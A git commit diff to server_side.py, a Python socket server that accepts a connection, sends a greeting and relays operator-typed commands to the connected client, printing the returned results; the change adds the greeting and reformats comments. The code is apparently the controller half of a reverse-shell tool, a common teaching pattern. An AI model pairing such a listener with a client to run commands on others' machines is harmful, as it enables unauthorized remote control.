430723edaee20b03af530a8b8bf7d36574a2e396
anthony jaquaniello <anthony.jaquaniello@gmail.com>
2024-07-04 11:11:41 +0200

    greeting message

--- server_side.py
+++ server_side.py
@@ -9,30 +9,31 @@ SERVER_HOST = "0.0.0.0" #all IPv4 addresses
 SERVER_PORT = args.port
 BUFFER_SIZE = 1024 #1kb, maximum amount of data to be received at once
 
-# socket object
+#socket object
 s = socket.socket()
-# bind the socket to Ips and port
+#bind the socket to Ips and port
 s.bind((SERVER_HOST, SERVER_PORT))
-# listen for a connection
+#listen for a connection
 s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
-# accept a connection and return a new socket to send and receive data + address
+#accept a connection and return a new socket to send and receive data + address
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
+client_socket.send("Greetings !".encode())
 
 while True:
-    # get the command prompt
+    #get the command prompt
     command = input("#:")
-    # send the command to the client
+    #send the command to the client
     client_socket.send(command.encode())
     if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
+        #if the command is exit, just break out of the loop
         break
-    # retrieve command results
+    #retrieve command results
     results = client_socket.recv(BUFFER_SIZE).decode()
     print(results)
-# close connection to the client
+#close connection to the client
 client_socket.close()
-# close server connection
+#close server connection
 s.close()
